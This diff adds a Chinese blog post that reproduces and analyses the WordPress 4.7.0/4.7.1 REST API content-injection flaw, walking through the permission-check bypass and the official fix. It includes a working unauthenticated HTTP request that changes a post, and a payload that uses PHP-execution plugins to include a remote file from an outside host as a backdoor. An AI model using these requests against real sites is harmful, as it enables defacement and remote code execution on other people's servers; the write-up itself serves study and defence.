@@ -1,0 +1,355 @@
+---
+layout: post
+title:  "WordPress REST API漏洞复现及分析"
+date:   2017-4-1
+excerpt: "就从这里开始我的代码审计之路吧。"
+feature: http://i1.piimg.com/589989/00d5439f21be297b.jpg
+tags: [vulnerability analysis]
+comments: true
+---
+
+# WordPress REST API漏洞复现及分析
+
+## 0x00  漏洞介绍
+
+#### 漏洞名称：
+>WordPress REST API 内容注入/权限提升
+
+#### 漏洞编号：
+>CNVD-ID:CNVD-2017-00818
+
+#### 发布时间：
+>2017-02-04
+
+#### 影响版本：
+>WordPress 4.7.0/4.7.1
+
+#### 漏洞描述：
+>WordPress是一个以PHP和MySQL为平台的自由开源的博客软件和内容管理系统。 WordPress REST API插件存在内容注入漏洞。远程攻击者可利用漏洞提升权限或执行内容注入操作，如：对WordPress所有文章内容执行修改、删除、创建等未授权操作。
+
+## 0x01  环境搭建
+### 0x01x01  搭建服务器环境
+#### 官方给出的服务器环境要求：
+>* PHP    5.2.4或更新版本
+>* MySQL  5.0或更新版本
+>* Apache mod_rewrite模块（可选，用于支持“固定链接”和“站点网络”功能）
+
+#### 复现环境（Centos6.5 64位 ）：
+>* PHP    5.3.3
+>* MySQL  5.1.73
+>* Apache mod_rewrite模块 -加载状态
+
+### 0x01x02  部署WordPress
+
+#### 下载安装：
+这里给出两个受影响版本的下载地址，均集成了REST API且默认开启。
+
+>[wordpress -4.7.0](https://wordpress.org/wordpress-4.7.zip)
+
+>[wordpress -4.7.1](https://wordpress.org/wordpress-4.7.1.zip)
+
+下载并解压到网站主目录（默认路径为<kbd>/var/www/html</kbd>），访问`http://127.0.0.1/wordpress` 按提示进行安装。
+安装完成后按下图设置wordpress站点为固定链接。
+
+{% capture images %}
+	http://i4.buimg.com/589989/19cccef2abf61906.png
+{% endcapture %}
+{% include gallery images=images caption="" cols=1 %}
+
+如需加载`mod_rewrite`模块，在Apache主配置文件中添加
+
+`LoadModule rewrite_module /usr/lib/apache2/modules/mod_rewrite.so`
+
+
+保存后记得重启Apache。
+
+## 0x02  漏洞复现
+
+###  0x02x01  关于REST-API
+
+REST API到底是个什么东西？有什么用呢？
+我查看了REST API的<a href=https://developer.wordpress.org/rest-api/>官方文档</a>，REST API提供了下列几种基本功能（<kbd>C</kbd><kbd>R</kbd><kbd>U</kbd><kbd>D</kbd>大家都懂）
+
+{% capture images %}
+	http://i4.buimg.com/589989/1a03bbdf062f236b.png
+{% endcapture %}
+{% include gallery images=images caption="" cols=1 %}
+
+通过不同的http请求方式GET、POST、DELETE来发送或接受JSON对象与站点进行交互。（seebug分析文章中称<kbd>PUT</kbd>方法触发Update功能，而官方文档并没有提及PUT方法，Definition显示Update功能是通过<kbd>POST</kbd>方法来触发的。）
+
+我们来演示一下<kbd>List Posts</kbd>功能：
+
+示例
+`$ curl http://demo.wp-api.org/wp-json/wp/v2/posts`
+
+在本环境中，访问以下链接可获取所有文章信息
+`http://127.0.0.1/wordpress/index.php/wp-json/wp/v2/posts`
+效果如下图：
+
+{% capture images %}
+	http://i4.buimg.com/589989/2899fe40cdcacc2e.png
+{% endcapture %}
+{% include gallery images=images caption="" cols=1 %}
+
+### 0x02x02  漏洞演示
+
+这里借助<kbd>BurpSuite</kbd>使用<kbd>Update</kbd>功能来修改id为1的文章标题为<kbd>Attack test</kbd>
+
+{% highlight html %}
+
+POST /wordpress/index.php/wp-json/wp/v2/posts/1?id=1a HTTP/1.1
+Host: 101.200.61.215
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
+Connection: close
+Content-Type: application/json
+Content-Length: 23
+
+{"title":"Attack test"}
+
+{% endhighlight %}
+
+查看一下返回：
+{% capture images %}
+	http://i2.muimg.com/589989/00b5e862edef9e4a.png
+{% endcapture %}
+{% include gallery images=images  cols=1 %}
+
+可以看到在没有任何身份认证的情况下成功返回状态码<kbd>200</kbd> ，且<kbd>response_body</kbd>中含有如下字段
+
+`"title":{"raw":"Attack test","rendered":"Attack test"}`
+
+证明标题修改成功，打开首页可以看到原标题<kbd>Hello World</kbd>已经变成了<kbd>Attack test</kbd>
+
+{% capture images %}
+	http://i4.buimg.com/589989/9872dbc5caab38f8.png
+    http://i4.buimg.com/589989/3543bee44f3e857d.png
+{% endcapture %}
+{% include gallery images=images caption="标题对比" cols=2 %}
+
+## 0x03  漏洞分析
+
+### 0x03x01  漏洞成因
+
+我们参考漏洞披露者提供的<a href=https://blog.sucuri.net/2017/02/content-injection-vulnerability-wordpress-rest-api.html>技术细节</a>探究一下漏洞形成的原因。
+
+先来看一下控制器文件
+
+`/wp-includes/rest-api/endpoints/class-wp-rest-posts-controller.php`
+
+{% highlight php %}
+
+register_rest_route( $this->namespace, '/' . $this->rest_base . '/(?P<id>[\d]+)', array(
+            array(
+                'methods'             => WP_REST_Server::READABLE,
+                'callback'            => array( $this, 'get_item' ),
+                'permission_callback' => array( $this, 'get_item_permissions_check' ),
+                'args'                => $get_item_args,
+            ),
+            array(
+                'methods'             => WP_REST_Server::EDITABLE,
+                'callback'            => array( $this, 'update_item' ),
+                'permission_callback' => array( $this, 'update_item_permissions_check' ),
+                'args'                => $this->get_endpoint_args_for_item_schema( WP_REST_Server::EDITABLE ),
+            ),
+            array(
+                'methods'             => WP_REST_Server::DELETABLE,
+                'callback'            => array( $this, 'delete_item' ),
+                'permission_callback' => array( $this, 'delete_item_permissions_check' ),
+                'args'                => array(
+                    'force' => array(
+                        'type'        => 'boolean',
+                        'default'     => false,
+                        'description' => __( 'Whether to bypass trash and force deletion.' ),
+                    ),
+                ),
+            ),
+            'schema' => array( $this, 'get_public_item_schema' ),
+        ) );
+        
+{% endhighlight %}
+
+这段函数的功能是注册REST API的路由，使用正则
+
+`$this->rest_base . '/(?P<id>[\d]+)'`
+
+意在保证只用<kbd>数字</kbd>来填充参数<kbd>id</kbd>的值
+
+也就是发送请求
+
+`GET wp-json/wp/v2/posts/1`
+
+<kbd>id</kbd>就会被设为1
+
+披露者称：When looking at how the REST API manages access, we quickly discover that it prioritizes <kbd>$_GET</kbd> and <kbd>$_POST</kbd> values over the ones generated by the route’s regular expression.
+
+在这里不作翻译但是如何解读呢？
+
+我们构造这样一个请求`http://101.200.61.215/wordpress/index.php/wp-json/wp/v2/posts/1?id=12a`返回
+
+`{"code":"rest_post_invalid_id","message":"Invalid post ID.","data":{"status":404}}`
+
+这说明如果是正则表达式优先对<kbd>id</kbd>进行处理的话，id=1是不会返回`rest_post_invalid_id`的。所以是<kbd>$_GET</kbd>优先对参数<kbd>id</kbd>进行了处理。如此一来，我们可以绕过正则表达式向<kbd>id</kbd>参数传入自定义的值。
+
+那么如何利用呢？审查回调函数注意到有这样两个方法，分别是<kbd>update_item</kbd>和它的权限检查方法<kbd>update_item_permissions_check</kbd>。先来看看
+<kbd>update_item_permissions_check</kbd>
+
+{% highlight php %}
+
+public function update_item_permissions_check( $request ) {
+
+        $post = get_post( $request['id'] );
+        $post_type = get_post_type_object( $this->post_type );
+
+        if ( $post && ! $this->check_update_permission( $post ) ) {
+            return new WP_Error( 'rest_cannot_edit', __( 'Sorry, you are not allowed to edit this post.' ), array( 'status' => rest_authorization_required_code() ) );
+        }
+
+        if ( ! empty( $request['author'] ) && get_current_user_id() !== $request['author'] && ! current_user_can( $post_type->cap->edit_others_posts ) ) {
+            return new WP_Error( 'rest_cannot_edit_others', __( 'Sorry, you are not allowed to update posts as this user.' ), array( 'status' => rest_authorization_required_code() ) );
+        }
+
+        if ( ! empty( $request['sticky'] ) && ! current_user_can( $post_type->cap->edit_others_posts ) ) {
+            return new WP_Error( 'rest_cannot_assign_sticky', __( 'Sorry, you are not allowed to make posts sticky.' ), array( 'status' => rest_authorization_required_code() ) );
+        }
+
+        if ( ! $this->check_assign_terms_permission( $request ) ) {
+            return new WP_Error( 'rest_cannot_assign_term', __( 'Sorry, you are not allowed to assign the provided terms.' ), array( 'status' => rest_authorization_required_code() ) );
+        }
+
+        return true;
+    }
+    
+{% endhighlight %}
+
+不难发现唯一一处限制参数<kbd>id</kbd>的就是第一条<kbd>if</kbd>语句,只要将<kbd>$post</kbd>置为空，函数就会<kbd>return true</kbd>,成功绕过权限检查。跟进<kbd>get_post</kbd>方法。
+
+{% highlight php %}
+
+function get_post( $post = null, $output = OBJECT, $filter = 'raw' ) {  
+    if ( empty( $post ) && isset( $GLOBALS['post'] ) )
+        $post = $GLOBALS['post'];
+
+    if ( $post instanceof WP_Post ) {
+        $_post = $post;
+    } elseif ( is_object( $post ) ) {
+        if ( empty( $post->filter ) ) {
+            $_post = sanitize_post( $post, 'raw' );
+            $_post = new WP_Post( $_post );
+        } elseif ( 'raw' == $post->filter ) {
+            $_post = new WP_Post( $post );
+        } else {
+            $_post = WP_Post::get_instance( $post->ID );
+        }
+    } else {
+        $_post = WP_Post::get_instance( $post );
+    }
+
+    if ( ! $_post )
+        return null;
+        
+{% endhighlight %}
+
+调用了wp-post中的<kbd>get_instance</kbd>方法，再次跟进
+
+{% highlight php %}
+
+public static function get_instance( $post_id ) {
+        global $wpdb;
+
+        if ( ! is_numeric( $post_id ) || $post_id != floor( $post_id ) || ! $post_id ) {
+            return false;
+        }
+
+        $post_id = (int) $post_id;
+
+        $_post = wp_cache_get( $post_id, 'posts' );
+
+        if ( ! $_post ) {
+            $_post = $wpdb->get_row( $wpdb->prepare( "SELECT * FROM $wpdb->posts WHERE ID = %d LIMIT 1", $post_id ) );
+
+            if ( ! $_post )
+                return false;
+
+            $_post = sanitize_post( $_post, 'raw' );
+            wp_cache_add( $_post->ID, $_post, 'posts' );
+        } elseif ( empty( $_post->filter ) ) {
+            $_post = sanitize_post( $_post, 'raw' );
+        }
+
+        return new WP_Post( $_post );
+    }
+    
+{% endhighlight %}
+
+分析第一条<kbd>if</kbd>语句可以得知，当<kbd>$post_id</kbd>不是纯数字时，该方法返回<kbd>false</kbd>导致<kbd>get_post</kbd>方法返回<kbd>null</kbd>，这样一来<kbd>update_item_permissions_check</kbd>方法中的$post为空，至此，成功绕过权限检查。
+
+再来看<kbd>update_item</kbd>方法
+
+{% highlight php %}
+
+    public function update_item( $request ) {
+        $id = (int) $request['id'];
+
+        $comment = get_comment( $id );
+        ......
+        
+{% endhighlight %}
+
+在这里参数<kbd>id</kbd>被直接转为了<kbd>int</kbd>型,这里演示一下这样会造成什么结果。
+
+{% capture images %}
+	http://i4.buimg.com/589989/232ebaea1496cc4c.png
+{% endcapture %}
+{% include gallery images=images  cols=1 %}
+
+也就是说如果<kbd>id=123helloworld</kbd>转为<kbd>int</kbd>型后<kbd>id=123</kbd>
+
+结合绕过权限检查的方法就完美解释了为什么我们在漏洞演示中发送<kbd>id=1a</kbd>的请求最终受伤的是<kbd>id=1</kbd>的post。
+
+### 0x03x02  利用拓展
+
+如果存在漏洞的WordPress安装了如 <kbd>insert_php</kbd>,<kbd>exec_php</kbd>等允许页面执行PHP代码的插件，可以构造数据包上传
+
+{% highlight html %}
+
+content<spanclass="token punctuation">:</span>"<span class="tokenpunctuation">[</span>insert_php<span class="tokenpunctuation">]</span> <span class="tokenkeyword">include</span><span class="tokenpunctuation">(</span>'http<span class="tokenpunctuation">[</span><span class="tokenpunctuation">:</span><span class="tokencomment">]//acommeamour.fr/tmp/xx.php'); [/insert_php][php] include('http[:]//acommeamour.fr/tmp/xx.php'); [/php]","id":"61a"}  </span>
+
+{% endhighlight %}
+
+木马被插件当做PHP代码执行，导致植入后门。
+
+## 0x04  漏洞修复
+我们来对比分析一下官方是如何修复的。关键点<kbd>get_instance</kbd>方法
+
+修复前：
+
+{% highlight php %}
+
+public static function get_instance( $post_id ) {
+        global $wpdb;
+
+        if ( ! is_numeric( $post_id ) || $post_id != floor( $post_id ) || ! $post_id ) {
+            return false;
+        }
+        
+{% endhighlight %}
+
+修复后：
+
+{% highlight php %}
+
+    public static function get_instance( $post_id ) {
+        global $wpdb;
+
+        if ( !$post_id ) {
+            return false;
+        }
+        
+{% endhighlight %}
+
+改动很简单，修改了对<kbd>$post_id</kbd>判断逻辑，消除了以这种形式<kbd>id=1a</kbd>绕过的可能。
+
+## 0x05  参考文章
+
+* https://blog.sucuri.net/2017/02/content-injection-vulnerability-wordpress-rest-api.html
+* https://www.seebug.org/vuldb/ssvid-92637
